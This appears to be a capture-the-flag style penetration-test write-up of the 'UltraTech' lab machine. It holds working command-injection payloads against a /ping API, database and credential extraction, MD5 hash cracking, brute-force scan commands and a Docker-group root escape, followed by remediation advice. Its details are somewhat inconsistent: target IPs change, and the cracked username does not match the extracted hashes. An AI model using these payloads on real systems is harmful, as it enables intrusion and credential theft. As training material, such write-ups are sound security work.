# UltraTech Penetration Testing Report

## Engagement Overview
- **Client**: UltraTech
- **Assessment Type**: Grey-box
- **Scope**: External Infrastructure
- **Target IP**: 10.10.88.255

## Initial Enumeration

### Nmap Scan
```sh
nmap -p- -sV -sC -T4 -o namp_scan 10.10.88.255
```

**Results:**

| PORT      | STATE | SERVICE | VERSION |
|-----------|-------|---------|---------|
| 21/tcp    | open  | ftp     | vsftpd 3.0.3 |
| 22/tcp    | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 8081/tcp  | open  | http    | Node.js Express framework |
| 31331/tcp | open  | http    | Apache httpd 2.4.29 (Ubuntu) |

## Identified Services & Attack Surface

### FTP (Port 21)

- **Version**: vsftpd 3.0.3
- **Potential Attacks:**
  ```sh
  nmap --script ftp-anon -p 21 10.10.88.255
  nmap --script ftp-brute -p 21 10.10.88.255
  ```

### SSH (Port 22)

- **Version**: OpenSSH 7.6p1
- **Potential Attacks:**
  ```sh
  nmap --script ssh-brute -p 22 10.10.88.255
  ```

### Web Application (Port 8081 - Node.js Express)

```sh
python3 /home/slehee/dirsearch/dirsearch.py -u http://10.10.88.255:31331

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12288

Target: http://10.10.88.255:31331/

[16:20:30] Scanning: 
[16:20:35] 403 -   294B - /.php
[16:20:43] 301 -   319B - /css  ->  http://10.10.88.255:31331/css/
[16:20:44] 200 -   15KB - /favicon.ico
[16:20:46] 200 -    4KB - /images/
[16:20:46] 301 -   322B - /images  ->  http://10.10.88.255:31331/images/
[16:20:46] 200 -    6KB - /index.html
[16:20:46] 301 -   326B - /javascript  ->  http://10.10.88.255:31331/javascript/
[16:20:46] 301 -   318B - /js  ->  http://10.10.88.255:31331/js/
[16:20:46] 200 -    1KB - /js/
[16:20:50] 200 -    53B - /robots.txt
[16:20:50] 403 -   303B - /server-status
[16:20:50] 403 -   304B - /server-status/

Task Completed
python3 /home/slehee/dirsearch/dirsearch.py -u http://10.10.88.255:8081 -w /snap/seclists/current/Discovery/Web-Content/api/api-endpoints-res.txt

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12043

Target: http://10.10.88.255:8081/

[16:33:50] Scanning: 
[16:33:51] 200 -    39B - /auth
[16:33:51] 500 -    1KB - /ping
[16:33:51] 200 -    20B - /?:

```

Follow `js`  /js  ->  http://10.10.88.255:31331/js/ to see how ping interacts with api.



## Exploitation

### Server-Side Request Forgery (SSRF) & Command Injection

- **Exploited API:** `/ping?ip=`
- **Payload:**
  ```sh
  curl -X GET "http://10.10.90.160:8081/ping?ip=127.0.0.1%0Als"
  ```

- **Alternativly** go to the website and use backticks  
```sh
http://10.10.90.160:8081/ping?ip=`ls`

http://10.10.90.160:8081/ping?ip=`cat utech.db.sqlite`
```
Which means that it takes priority to execute in thius case!!


- **Findings:**
  ```plaintext
  index.js
  node_modules
  package.json
  start.sh
  utech.db.sqlite
  ```

### Extracting Credentials from Database

- **Payload:**
  ```sh
  curl -X GET "http://10.10.90.160:8081/ping?ip=127.0.0.1%0Acat%20utech.db.sqlite.b64" --output utech.db.sqlite.b64
  base64 -d utech.db.sqlite.b64 > utech.db.sqlite
  ```
- **Extracted Hashes:**
  ```plaintext
  r00t:f357a0c52799563c7c7b76c1e7543a32 <---username is r00t
  admin:0d0ea5111e3c1def594c1684e3b9be84
  ```

### Cracking Hashes (MD5)

- **Command:**
  ```sh
  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
  ```
- **Cracked Credentials:**
  ```plaintext
  Username: mrsheafy
  Password: n100906
  ```

## Privilege Escalation

### SSH Access

- **Command:**
  ```sh
  ssh r00t@10.10.90.160
  ```

### Docker Privilege Escalation

- **User Groups:**
  ```sh
  groups
  ```
  **Result:** `r00t docker`
- **Exploitation using GTFOBins:**
  ```sh
  docker run -v /:/mnt --rm -it bash chroot /mnt sh
  ```
- **Gained Root Access:**
  ```sh
  whoami
  root
  ```

## Summary

### Findings:

- **Command Injection via /ping API** → Led to database extraction.
- **Weak MD5 Hashes** → Cracked admin credentials.
- **SSH Access with Admin Credentials** → Allowed deeper enumeration.
- **Docker Misconfiguration** → Allowed root access.

### Recommendations:

1. **Sanitize API Inputs** - Prevent command injection.
2. **Enforce Strong Hashing Algorithms** - Use bcrypt instead of MD5.
3. **Limit User Privileges** - Remove unnecessary docker access.
4. **Update Software** - Apache, OpenSSH, and other services should be patched.

---

**Status:** Root Access Achieved ✅


